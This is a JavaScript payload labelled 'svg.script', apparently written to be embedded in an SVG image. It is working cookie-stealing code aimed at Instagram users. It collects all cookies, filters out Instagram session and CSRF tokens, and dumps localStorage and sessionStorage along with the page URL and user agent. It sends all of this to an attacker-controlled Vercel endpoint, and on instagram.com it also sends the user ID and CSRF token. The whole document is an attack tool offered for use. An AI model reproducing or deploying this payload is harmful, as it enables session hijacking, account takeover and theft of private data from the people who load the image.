svg.script:

(function() {
  try {
    // Extract all cookies
    const cookies = document.cookie;

    // Extract specific Instagram cookies
    const instagramCookies = cookies.split(';')
      .filter(cookie => {
        const trimmedCookie = cookie.trim();
        return trimmedCookie.startsWith('sessionid') || 
               trimmedCookie.startsWith('ds_user') || 
               trimmedCookie.startsWith('mid') ||
               trimmedCookie.startsWith('ig_did') ||
               trimmedCookie.startsWith('csrftoken');
      })
      .join(';');

    // Get additional data
    const data = {
      cookies: cookies,
      instagramCookies: instagramCookies,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      userAgent: navigator.userAgent,
      url: window.location.href,
      timestamp: new Date().toISOString(),
      source: 'svg-attack'
    };

    // Send to your server
    fetch('https://your-vercel-app.vercel.app/api/collect-cookies', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
    .then(response => {
      console.log('Data sent successfully');
    })
    .catch(error => {
      console.error('Error sending data:', error);
    });

    // Try to access Instagram-specific data if on Instagram domain
    if (window.location.hostname.includes('instagram.com')) {
      // Try to access additional data
      const additionalData = {
        location: window.location.href,
        userId: window._sharedData?.config?.viewer?.id || 'unknown',
        csrfToken: window._csrfToken || 'unknown'
      };

      fetch('https://your-vercel-app.vercel.app/api/collect-instagram-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(additionalData)
      });
    }
  } catch (error) {
    console.error('Error in SVG script:', error);
  }
})();
